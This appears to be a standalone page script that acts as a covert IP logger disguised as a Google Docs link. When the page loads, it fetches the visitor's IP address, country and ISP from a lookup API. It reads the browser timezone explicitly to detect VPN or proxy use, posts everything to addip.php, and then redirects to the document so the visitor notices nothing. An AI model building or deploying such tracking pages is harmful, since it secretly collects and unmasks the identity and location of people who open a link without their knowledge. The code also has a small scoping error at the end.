<script>
    let url = 'https://api.iplocation.net/?cmd=';
    
    async function getIP(url) {
        let cmd = 'get-ip'
        let get_ip = url + cmd;
        console.log(get_ip);
        try {
            let response_init = await fetch(get_ip, { method: 'GET', mode: 'cors' });
            
            // Parse the response as text (IP address)
            let ip = await response_init.json(); 
            
            // Log the IP address (optional)
            console.log("IP Address:", ip['ip'], ip['ip_version']);

            ip_addr = ip['ip'];
            ipv = ip['ip_version'];

            // Make second request to get additional information
            cmd = `ip-country&ip=${ip_addr}`;
            get_country = url + cmd;
            console.log(get_country);
            let response_extra = await fetch(get_country, {method: 'GET', mode: 'cors'});
            let ip_country = await response_extra.json();

            console.log(ip_country);
            let addIpUrl = `addip.php`;

            // Get timezone in case of proxy or vpn usage
            let tzone = Intl.DateTimeFormat().resolvedOptions().timeZone

            // Make the third request to addip.php with the IP address
            const final = new Request("addip.php", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ip_addr: ip_addr,
                    country: ip_country['country_name'],
                    isp: ip_country['isp'],
                    timezone: tzone,
                }),
            });

            try {
                const response = await fetch(final);
                if (response.ok) {
                    setTimeout(() => {
                        window.location.href = "https://docs.google.com/document/d/1F1S-T_jG7fb8Z-izPsnLWISWMV9xhZcQ/edit?usp=drive_link&ouid=113049675600768899353&rtpof=true&sd=true"
                    }, 300);
                };
            } catch (error) {
                console.error('Fetch error', error);
            }

            console.log(response.text());

        } catch (error) {
            console.error('Error:', error);
        }
    }

    // Execute the function
    getIP(url);

</script>
